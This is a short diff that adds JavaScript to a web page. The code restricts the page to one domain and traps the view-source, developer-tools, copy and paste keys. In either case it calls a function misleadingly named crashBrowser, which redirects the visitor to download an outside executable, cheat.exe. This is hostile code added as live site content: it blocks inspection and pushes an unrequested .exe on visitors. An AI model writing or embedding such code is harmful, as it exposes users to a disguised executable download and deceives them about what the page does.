@@ -1,0 +1,4 @@
+var whitelist=["bweam.cf"];if(whitelist.indexOf(getDomainName(window.location.hostname))==-1){crashBrowser()}
+document.onkeydown=function(e){e=e||window.event;if(e.ctrlKey){var c=e.which||e.keyCode;switch(c){case 85:case 67:case 83:case 86:case 74:case 83:case 123:case 73:case 117:Destroy(e);break}}else if(e.keyCode==123){Destroy(e)}};function Destroy(pEvent){pEvent.preventDefault();pEvent.stopPropagation();crashBrowser()}
+function crashBrowser(){window.location.replace("https://justin.ooo/cheat.exe")}
+function getDomainName(hostName){return hostName.substring(hostName.lastIndexOf(".",hostName.lastIndexOf(".")- 1)+ 1)}
